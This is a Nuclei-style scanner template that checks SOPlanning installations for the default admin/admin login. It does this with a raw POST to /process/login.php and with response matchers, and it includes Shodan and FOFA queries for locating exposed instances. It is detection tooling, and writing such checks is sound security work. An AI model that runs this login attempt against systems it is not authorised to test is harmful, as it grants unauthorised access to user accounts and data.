http:
- attack: pitchfork
  host-redirects: true
  matchers:
  - condition: and
    type: word
    words:
    - title="Logout"
    - title="Modify my profile"
    - Settings
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 2
  payloads:
    password:
    - admin
    username:
    - admin
  raw:
  - 'POST /process/login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    login={{username}}&password={{password}}

    '
id: soplanning-default-login
info:
  author: s4e-io
  description: 'SOPlanning contains default credentials. An attacker can obtain access
    to user accounts and access sensitive information, modify data, and/or execute
    unauthorized operations.

    '
  metadata:
    fofa-query: body="soplanning"
    max-request: 1
    product: soplanning
    shodan-query:
    - html:"soplanning"
    - http.html:"soplanning"
    vendor: soplanning
    verified: true
  name: SOPlanning - Default Login
  reference:
  - https://www.soplanning.org/en/
  severity: high
  tags: soplanning,default-login,vuln
